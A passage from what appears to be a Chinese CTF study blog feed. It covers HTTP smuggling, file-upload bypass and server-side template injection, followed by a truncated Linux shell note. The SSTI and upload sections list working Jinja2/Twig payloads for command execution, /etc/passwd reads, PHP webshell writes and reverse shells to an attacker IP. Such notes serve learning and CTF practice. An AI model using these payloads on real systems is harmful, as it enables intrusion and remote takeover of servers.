class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>前端视角：看到 TE: chunked。它解析分块：第一块长8字节，内容是 SMUGGLED；第二块长0，结束。所以它将整个Body（SMUGGLED）转发给后端。<br>后端视角：看到 CL&#x3D;3，它只从Body中读取3个字节（即 8\r\n），然后就认为这个请求结束了。<br>结果：剩余的字节 SMUGGLED\r\n0\r\n\r\n 被留在了缓冲区内，成为了下一个请求的开头。</p><h3 id="3、HTTP方法覆盖"><a href="#3、HTTP方法覆盖" class="headerlink" title="3、HTTP方法覆盖"></a>3、HTTP方法覆盖</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">操作：使用POST方法，但携X-HTTP-Method-Override: PUT头部。</span><br><span class="line">原因：WAF可能只检查标准的GET/POST方法，但后端框架会解析这个头部，将请求当作PUT方法处理，从而执行了WAF未检查的逻辑</span><br></pre></td></tr></table></figure><h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><h3 id="1、扩展名绕过"><a href="#1、扩展名绕过" class="headerlink" title="1、扩展名绕过"></a>1、扩展名绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、使用未被禁用的后缀绕过</span><br><span class="line">2、后缀里面使用大小写来混淆，如a.Php</span><br><span class="line">3、最末尾加一个.号，如a.php.</span><br><span class="line">4、使用双拓展名，如a.jpg.php或a.php.jpg</span><br><span class="line">5、使用不常见拓展名绕过，假如禁用.php后缀，可以使用.php4、.php5、.phtml等后缀</span><br><span class="line">6、上传时用bp拦截请求，在其中修改文件后缀，用于绕过前端校验</span><br></pre></td></tr></table></figure><h3 id="2、文件头绕过"><a href="#2、文件头绕过" class="headerlink" title="2、文件头绕过"></a>2、文件头绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在构造的恶意文件开头加上图片或者其他的魔术字节，用于绕过服务器的文件头检查</span><br></pre></td></tr></table></figure><h3 id="3、-htaccess文件上传绕过"><a href="#3、-htaccess文件上传绕过" class="headerlink" title="3、.htaccess文件上传绕过"></a>3、.htaccess文件上传绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传一个.htaccess配置文件，修改服务器配置，让其解析指定后缀文件为php文件进行执行</span><br><span class="line">仅Apache服务器</span><br></pre></td></tr></table></figure><h3 id="4、图片元数据绕过"><a href="#4、图片元数据绕过" class="headerlink" title="4、图片元数据绕过"></a>4、图片元数据绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、用010Editor在图片编码末尾后面添加恶意代码</span><br><span class="line">2、用exiftool工具向图片的Exif信息中写入PHP代码：</span><br><span class="line">exiftool -Comment=&#x27;&lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;&#x27; image.jpg</span><br><span class="line">然后通过文件包含漏洞来执行这张图片中的代码</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;字符绕过&quot;&gt;&lt;a href=&quot;#字符绕过&quot; class=&quot;headerlink&quot; title=&quot;字符绕过&quot;&gt;&lt;/a&gt;字符绕过&lt;/h2&gt;&lt;h3 id=&quot;1、大小写绕过&quot;&gt;&lt;a href=&quot;#1、大小写绕过&quot; class=&quot;headerlink&quot; title=&quot;1、大</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>SSTI学习笔记</title>
    <link href="https://aihenai.github.io/2025/11/10/SSTI/"/>
    <id>https://aihenai.github.io/2025/11/10/SSTI/</id>
    <published>2025-11-09T16:00:00.000Z</published>
    <updated>2025-12-07T12:52:58.331Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当用户的输入被直接拼接进模板，并且未经严格过滤就被渲染时，如果用户输入包含了模板语法，该语法就会被执行，从而导致SSTI漏洞。</p><h2 id="常见模板"><a href="#常见模板" class="headerlink" title="常见模板"></a>常见模板</h2><p>Jinja2 (Python)：常使用49探测是否有ssti漏洞</p><p>Twig (PHP)：与Jinja2相同</p><p>Smarty (PHP)：常使用{7*7}探测是否有ssti漏洞</p><h2 id="语句包裹符号"><a href="#语句包裹符号" class="headerlink" title="语句包裹符号"></a>语句包裹符号</h2><h3 id="Jinja2-Twig"><a href="#Jinja2-Twig" class="headerlink" title="Jinja2 &#x2F;Twig"></a>Jinja2 &#x2F;Twig</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#125;&#125;包裹变量/输出语法</span><br><span class="line">&#123;% %&#125;包裹控制语句，&#123;% endif %&#125;和&#123;% endfor %&#125;是if和for语句的结束符</span><br><span class="line">&#123;#  #&#125;包裹注释</span><br><span class="line">&#123;&#123; name|upper &#125;&#125;过滤</span><br></pre></td></tr></table></figure><h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;$变量名&#125;或&lt;%变量名%&gt;包裹变量</span><br><span class="line">&lt;&#123;  &#125;&gt;包裹控制语句</span><br><span class="line">&#123;*  *&#125;注释</span><br><span class="line">&#123; &#125;标签界定符，中间默认为smarty语法，会被解析执行</span><br></pre></td></tr></table></figure><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h3><h4 id="1、获取配置信息"><a href="#1、获取配置信息" class="headerlink" title="1、获取配置信息"></a>1、获取配置信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;输出所有配置信息</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;列表形式输出配置信息</span><br><span class="line">&#123;&#123;config.SECERT_KEY&#125;&#125;精准输出指定配置信息</span><br></pre></td></tr></table></figure><h4 id="2、获取信息"><a href="#2、获取信息" class="headerlink" title="2、获取信息"></a>2、获取信息</h4><p>用python内置的各种模块及里面的函数来获取需要的信息，比如flag的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">常用模块：</span><br><span class="line">os与操作系统交互，获取系统环境变量、执行系统命令、操作文件路径等</span><br><span class="line">sys获取 Python 解释器相关信息，以及与程序运行时环境交互</span><br><span class="line"></span><br><span class="line">常用模块下的函数：</span><br><span class="line">os</span><br><span class="line">os.environ：获取系统环境变量</span><br><span class="line">os.getcwd()：获取当前工作目录</span><br><span class="line">os.listdir(path)：列出指定目录下的文件和文件夹</span><br><span class="line">os.popen(command)：执行系统命令并获取输出，常与.read()搭配使用</span><br><span class="line"></span><br><span class="line">sys</span><br><span class="line">sys.version获取 Python 版本</span><br><span class="line">sys.platform获取操作系统平台</span><br><span class="line">sys.argv获取命令行参数</span><br><span class="line">sys.argv[0]显示脚本绝对路径</span><br><span class="line">sys.modules获取当前已加载的模块列表（用于寻找可用模块绕过过滤）</span><br><span class="line"></span><br><span class="line">常用的内置函数:</span><br><span class="line">range()生成一个整数序列，常用于循环</span><br><span class="line">__import__()动态导入 Python 模块</span><br><span class="line">open().read()读取文件内容</span><br><span class="line">eval()执行一个 Python 表达式</span><br><span class="line">exec()执行动态生成的 Python 代码块</span><br><span class="line">__class__, __bases__, __subclasses__()遍历 Python 的类继承树，寻找可利用的类</span><br><span class="line">getattr()通过字符串名称获取对象的属性或方法，可以绕过对特定方法名的过滤</span><br></pre></td></tr></table></figure><h4 id="3、过滤绕过"><a href="#3、过滤绕过" class="headerlink" title="3、过滤绕过"></a>3、过滤绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">字符串拼接</span><br><span class="line">&#123;&#123; __import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;whoami&#x27;).read() &#125;&#125;‘+’拼接</span><br><span class="line">&#123;&#123; __import__(&#x27;os&#x27;[:2]).popen(&#x27;whoami&#x27;).read() &#125;&#125;[:2]取引号中前两个字符</span><br><span class="line">&#123;&#123; __import__(&#x27;so&#x27;[::-1]).popen(&#x27;pwd&#x27;).read() &#125;&#125;[::-1]将引号中的字符进行反转</span><br><span class="line"></span><br><span class="line">编码绕过</span><br><span class="line">&#123;&#123; __import__(&#x27;base64&#x27;).b64decode(&#x27;b3M=&#x27;).decode() &#125;&#125;  # 解码为 os</span><br><span class="line"></span><br><span class="line">用 include/import 导入恶意模板</span><br><span class="line">&#123;&#123; include(&#x27;恶意模板&#x27;) &#125;&#125;若恶意模板可控，可注入代码</span><br><span class="line">&#123;&#123; import(&#x27;恶意模块&#x27;).func() &#125;&#125;导入恶意模块执行函数，func代指恶意模块中的一个函数或者宏的命名</span><br><span class="line"></span><br><span class="line">利用循环/条件语句构造 payload</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;Popen&#x27; %&#125;&#123;&#123; c(&#x27;whoami&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">遍历所有子类，寻找Popen，利用其执行命令whoami并借助read()输出结果</span><br></pre></td></tr></table></figure><h4 id="4、沙箱逃逸"><a href="#4、沙箱逃逸" class="headerlink" title="4、沙箱逃逸"></a>4、沙箱逃逸</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">思路：</span><br><span class="line">获取object基类：通过已知对象（如字符串、列表）的__class__和__mro__属性获取。</span><br><span class="line">列出所有子类：通过__subclasses__()方法获取所有子类。</span><br><span class="line">寻找有用的类：如catch_warnings、_wrap_close、Popen等。</span><br><span class="line">利用找到的类：通过类的__globals__、__init__等属性获取模块和内置函数。</span><br><span class="line">执行代码或命令：通过导入模块或调用函数执行系统命令。</span><br></pre></td></tr></table></figure><h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><h4 id="1、确定方式"><a href="#1、确定方式" class="headerlink" title="1、确定方式"></a>1、确定方式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在&#123;&#123;7*7&#125;&#125;确定是Jianja2和Twig其中之一后，可以使用Twig的特有语法来确定，比如：</span><br><span class="line">&#123;&#123;_self&#125;&#125;                输出Twig对象信息</span><br><span class="line">&#123;&#123;dump(_self)&#125;&#125;          尝试dump函数</span><br><span class="line">&#123;&#123;app&#125;&#125;                  检查Symfony环境</span><br><span class="line">&#123;&#123;_self.env&#125;&#125;            输出Twig环境对象 </span><br><span class="line">&#123;&#123;app&#125;&#125;                  检查Symfony环境，输出应用对象</span><br><span class="line">&#123;&#123;this&#125;&#125;                 其他框架的当前对象</span><br><span class="line">&#123;&#123;&#125;&#125;                     触发Twig语法错误</span><br><span class="line">&#123;&#123; unknown_variable &#125;&#125;   查看错误信息特征</span><br></pre></td></tr></table></figure><h4 id="2、获取信息-1"><a href="#2、获取信息-1" class="headerlink" title="2、获取信息"></a>2、获取信息</h4><p>获取信息就是寻找可以注入并执行命令的变量，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">包含可以执行命令的方法的对象，如</span><br><span class="line">app、request、system</span><br><span class="line">可以用于文件读取的对象，如</span><br><span class="line">file_system、storage</span><br><span class="line">可以用于代码执行的对象，如</span><br><span class="line">evaluator、serializer</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">获取变量的方式：</span><br><span class="line"></span><br><span class="line">获取环境信息</span><br><span class="line">1、&#123;&#123; _self.env &#125;&#125;-Twig环境信息</span><br><span class="line">2、&#123;&#123; app.request.server.all|join(&#x27;, &#x27;) &#125;&#125; -服务器环境变量</span><br><span class="line">3、&#123;&#123; phpversion() &#125;&#125; -PHP版本信息</span><br><span class="line"></span><br><span class="line">获取所有变量</span><br><span class="line">1、&#123;% for key, value in _context %&#125;&#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;&#123;% endfor %&#125;</span><br><span class="line">2、&#123;&#123; _context|json_encode &#125;&#125;</span><br><span class="line"></span><br><span class="line">查看对象属性</span><br><span class="line">&#123;% for prop in app|properties %&#125;&#123;&#123; prop &#125;&#125;: &#123;&#123; attribute(app, prop) &#125;&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">查看对象方法</span><br><span class="line">&#123;% for method in app|methods %&#125;&#123;&#123; method &#125;&#125;&#123;% if method starts with &#x27;get&#x27; %&#125;结果: &#123;&#123; attribute(app, method) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h4 id="3、命令注入"><a href="#3、命令注入" class="headerlink" title="3、命令注入"></a>3、命令注入</h4><p>在搜集完变量之后，寻找其中的可用路径，执行各类命令进行深入挖掘</p><h5 id="一、命令注入"><a href="#一、命令注入" class="headerlink" title="一、命令注入"></a>一、命令注入</h5><p>1、使用过滤器：<br>原理：当 Twig 的某些过滤器（如 filter, map, reduce）在寻找回调函数时，如果发现你传递的不是一个已定义的 Twig 函数，它会尝试将这个字符串当作一个PHP 原生函数名来调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">（1）、使用system过滤器</span><br><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">（2）、使用map过滤器</span><br><span class="line">&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|map(&#x27;system&#x27;)|join&#125;&#125;</span><br><span class="line"></span><br><span class="line">（3）、使用reduce过滤器</span><br><span class="line">&#123;&#123;[0,0]|reduce(&#x27;system&#x27;,&#x27;whoami&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>2、直接PHP函数调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#x27;id&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;passthru(&#x27;ls -la&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;shell_exec(&#x27;whoami&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure><p>3、使用函数执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）、eval（）</span><br><span class="line">&#123;&#123;eval(&#x27;system(&quot;id&quot;);&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">（2）assert（）</span><br><span class="line">assert 是一个 PHP 内置函数，它的主要作用是检查一个表达式是否为 true。如果表达式为 false，它会触发一个断言错误，然而，在特定的 PHP 版本和配置下，assert 可以执行任意代码</span><br><span class="line">&#123;&#123;assert(&#x27;system(&quot;whoami&quot;)&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="二、文件操作"><a href="#二、文件操作" class="headerlink" title="二、文件操作"></a>二、文件操作</h5><p>1、文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;file_get_contents(&#x27;&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;readfile(&#x27;&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;file(&#x27;&#x27;)|join&#125;&#125;</span><br></pre></td></tr></table></figure><p>2、使用PHP包装器绕过限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;file_get_contents(&#x27;php://filter/convert.base64-encode/resource=/etc/passwd&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>3、文件写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;file_put_contents(&#x27;shell.php&#x27;, &#x27;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>4、目录遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;scandir(&#x27;/&#x27;)|join(&#x27;, &#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="4、字符绕过"><a href="#4、字符绕过" class="headerlink" title="4、字符绕过"></a>4、字符绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">字符拼接</span><br><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;sys&#x27;~&#x27;tem&#x27;)&#125;&#125;使用&#x27;~&#x27;符号</span><br><span class="line">&#123;% set cmd = &#x27;system&#x27; %&#125;&#123;&#123;[&#x27;id&#x27;]|filter(cmd)&#125;&#125;定义某个指定字符替换特定字符</span><br><span class="line">&#123;% set filters = [&#x27;sys&#x27;,&#x27;tem&#x27;] %&#125;&#123;&#123;[&#x27;id&#x27;]|filter(filters|join)&#125;&#125;使用join拼接</span><br><span class="line"></span><br><span class="line">编码绕过</span><br><span class="line"></span><br><span class="line">Base64</span><br><span class="line">&#123;% set cmd = &#x27;Y2F0IC9ldGMvcGFzc3dk&#x27; %&#125;&#123;&#123;[cmd]|filter(&#x27;base64_decode&#x27;)|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">Url</span><br><span class="line">&#123;% set cmd = &#x27;cat%20%2Fetc%2Fpasswd&#x27; %&#125;&#123;&#123;[cmd]|filter(&#x27;urldecode&#x27;)|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">利用Twig内置功能</span><br><span class="line">&#123;&#123; attribute(object, property) &#125;&#125;attribute函数</span><br></pre></td></tr></table></figure><h4 id="5、获取shell"><a href="#5、获取shell" class="headerlink" title="5、获取shell"></a>5、获取shell</h4><p>一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;file_put_contents(&#x27;shell.php&#x27;, &#x27;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;file_put_contents(&#x27;shell.inc.php&#x27;, &#x27;&lt;?php @eval($_REQUEST[&quot;c&quot;]);?&gt;&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;file_put_contents(&#x27;shell.php&#x27;, &#x27;&lt;?php @eval(base64_decode($_POST[&quot;c&quot;]));?&gt;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/公网ip/4444 0&gt;&amp;1&quot;&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;...&quot;: 执行双引号中的字符串作为bash命令。</span><br><span class="line">bash -i: 启动一个交互式的bash shell。</span><br><span class="line"></span><br><span class="line">&amp; /dev/tcp/ATTACKER_IP/4444:/dev/tcp/公网ip/4444是一个特殊的文件，它代表与公网ip的4444端口建立的 TCP 连接。</span><br><span class="line">&amp; 是一个文件描述符重定向操作符，它将标准输出(stdout, 文件描述符1)和标准错误(stderr, 文件描述符2)都重定向到这个TCP连接。</span><br><span class="line">0&gt;&amp;1: 将标准输入(stdin, 文件描述符0)也重定向到标准输出，而标准输出已经被重定向到了TCP连接。这样，攻击者的输入就变成了shell的输入。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;nc -e /bin/sh 公网ip 4444&#x27;]|filter(&#x27;system&#x27;)&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc ATTACKER_IP 4444: 让目标服务器与攻击者的公网ip和4444端口建立一个TCP连接。</span><br><span class="line">-e /bin/sh: 这是nc的一个非常强大的参数。它指定在连接建立后，在目标服务器上执行/bin/sh(一个 shell)，并将这个shell的输入和输出绑定到nc建立的网络连接上</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[&#x27;php -r \&#x27;$s=fsockopen(&quot;公网ip&quot;,4444);exec(&quot;/bin/sh-i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;]|filter(&#x27;syste m&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;...&#x27;: 执行单引号中的PHP代码。</span><br><span class="line">$s=fsockopen(&quot;公网ip&quot;,4444);:在 PHP 中，fsockopen()函数用于打开一个网络连接。</span><br><span class="line">这行代码会在目标服务器上创建一个到攻击者 IP 和端口的 TCP 连接，并将这个连接的资源句柄保存到变量$s中。</span><br><span class="line">exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);: exec()函数执行系统命令/bin/sh -i，即启动一个交互式shell。</span><br><span class="line">&lt;&amp;3, &gt;&amp;3, 2&gt;&amp;3:  这是关键的文件描述符重定向。在PHP中，fsockopen创建的套接字连接通常被分配文件描述符3。这行命令将shell的标准输入、输出和错误都重定向到这个套接字连接（&amp;3）。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a&gt;漏洞成因&lt;/h2&gt;&lt;p&gt;当用户的输入被直接拼接进模板，并且未经严格过滤就被渲染时，如果用户输入包含了模板语法，该语法就会被执行，从而导致SSTI漏洞</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>Linux学习笔记</title>
    <link href="https://aihenai.github.io/2025/11/09/Linux/"/>
    <id>https://aihenai.github.io/2025/11/09/Linux/</id>
    <published>2025-11-08T16:00:00.000Z</published>
    <updated>2025-12-07T13:49:23.494Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>命令解释器&#x2F;一种强大的脚本语言</p><h3 id="Bourne-Shell-sh"><a href="#Bourne-Shell-sh" class="headerlink" title="Bourne Shell(sh)"></a>Bourne Shell(sh)</h3><p>Unix 系统上最初的、也是最主要的 Shell。</p><p><strong>主要用途</strong>：</p><p>Unix shell 脚本的<strong>事实标准</strong>；在现代 Linux 系统中，<code>/bin/sh</code> 通常已经是一个<strong>指向其他 Shell（如 <code>bash</code> 或 <code>dash</code>）的符号链接</strong>，但为了保持兼容性，它会运行在一种尽可能<strong>模拟原始 Bourne Shell</strong> 的模式下。</p><h3 id="Bourne-Again-Shell-bash"><a href="#Bourne-Again-Shell-bash" class="headerlink" title="Bourne-Again Shell(bash)"></a>Bourne-Again Shell(bash)</h3><p>主要用途：</p><p>交互式使用：绝大多数 Linux 发行版的默认 Shell 都是 bash，它提供了如命令历史、命令补全、作业控制、丰富的配置选项（~&#x2F;.bashrc 文件）等功能；</p><p>脚本编写：它完全兼容 Bourne Shell 脚本，并进行了大量扩展，功能非常强大。是目前编写复杂脚本最流行的选择之一。</p><p>(命令历史：上下键操作，在终端中输入 history，会列出所有记录的历史命令，每条命令前面有一个编号，输入!编号可以再次执行指定历史命令，也可以Ctrl+R输入命令片段进行搜索，然后回车执行，Ctrl+C取消搜索，history -c可以清除当前会话的历史记录。</p><p>作业控制：Ctrl+Z暂停当前进程挂入后台，jobs列出后台所有进程，fg  %作业编号将后台指定进程挂入前台，bg  %作业编号恢复指定进程在后台运行，在命令后加&amp;可让进程直接在后台启动运行。</p><p>~&#x2F;.bashrc 文件：可以为命令设置别名（alias 指定字符&#x3D;指定命令），通过修改变量 PS1来改变终端提示符的样式，定义一些程序运行所需要的环境变量，定义自定义函数，修改完毕后重新打开一个终端窗口或者使用命令source ~&#x2F;.bashrc；可简写为 . ~&#x2F;.bashrc。)</p><h3 id="C-Shell-csh"><a href="#C-Shell-csh" class="headerlink" title="C Shell(csh)"></a>C Shell(csh)</h3><p><strong>主要用途</strong>：</p><p>交互式使用：首次引入了很多如<strong>命令历史</strong>、<strong>别名</strong>等交互特性。其语法设计模仿 C 语言，对熟悉 C 的程序员来说更直观。</p><h3 id="Tenex-C-Shell-tcsh"><a href="#Tenex-C-Shell-tcsh" class="headerlink" title="Tenex C Shell(tcsh)"></a>Tenex C Shell(tcsh)</h3><p>csh增强版，在 <code>csh</code> 的基础上增加了更强大的<strong>命令行补全、命令行编辑</strong>等功能。</p><h3 id="Korn-Shell-ksh"><a href="#Korn-Shell-ksh" class="headerlink" title="Korn Shell(ksh)"></a>Korn Shell(ksh)</h3><p><strong>主要用途</strong>：</p><p>交互式使用：<code>bash</code> 流行之前，<code>ksh</code> 因其出色的<strong>交互体验</strong>和<strong>脚本性能</strong>而备受青睐，尤其是在商业 Unix 系统（如 AIX、HP-UX）中。</p><p>脚本编写：引入了很多先进的编程特性，如<strong>关联数组、浮点数运算</strong>等，这些特性后来也被 <code>bash</code> 借鉴。</p><h3 id="Z-Shell-zsh"><a href="#Z-Shell-zsh" class="headerlink" title="Z Shell(zsh)"></a>Z 